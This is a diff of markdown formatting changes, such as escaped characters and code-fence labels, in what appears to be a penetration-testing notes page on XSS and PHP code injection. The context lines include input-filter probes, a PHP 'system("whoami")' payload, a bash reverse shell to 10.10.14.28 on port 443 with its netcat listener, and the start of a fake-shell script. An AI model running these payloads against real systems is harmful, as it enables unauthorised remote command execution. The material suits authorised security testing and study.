@@ -15,16 +15,16 @@ Input fields may be found in the following examples:
 
 **Try inserting special characters to see if they are not filtered:**
 
-```text
+```
 < >; ' " { } ;
 ```
 
-* &lt; &gt;; = denote elements in HTML
+* < >; = denote elements in HTML
 * ' " = denote strings on JavaScript
 * {} = function declarations of JavaScript
 * ; = end of a statement on JavaScript
-* &lt;?php = PHP code
-* ?&gt; = end of PHP code
+* \<?php = PHP code
+* ?> = end of PHP code
 
 **If these characters are not removed or encoded then the website might be vulnerable to XSS:**
 
@@ -40,7 +40,7 @@ Test HTML tags in input fields:
 <marquee>Hola</marquee>
 ```
 
-Test malicious code in other languages \(e.g PHP\)
+Test malicious code in other languages (e.g PHP)
 
 ```php
 <?php system("whoami"); ?>
@@ -58,7 +58,7 @@ bash -i >& /dev/tcp/10.10.14.28/443 0>&1
 
 Set a listener on a port of your choosing:
 
-```text
+```
 nc -lvnp 443
 ```
 
@@ -70,7 +70,7 @@ Inject a malicious PHP code:
 
 ### Fake Shell via Continous PHP Injection
 
-The following code enters in a while loop to execute the commands and we use **read** to parse the output:
+The following code enters in a while loop to execute the commands and we use **read **to parse the output:
 
 ```bash
 #!/bin/bash
@@ -97,6 +97,5 @@ The script above was made by S4vitar.
 Things to keep in mind:
 
 * Cookie = You don't need a cookie if you don't have to be authenticated.
-* -G = This sends a GET request and the content in the URL.
+* \-G = This sends a GET request and the content in the URL.
 * grep = If you don't need to filter the output, then you may remove the grep commands.
-
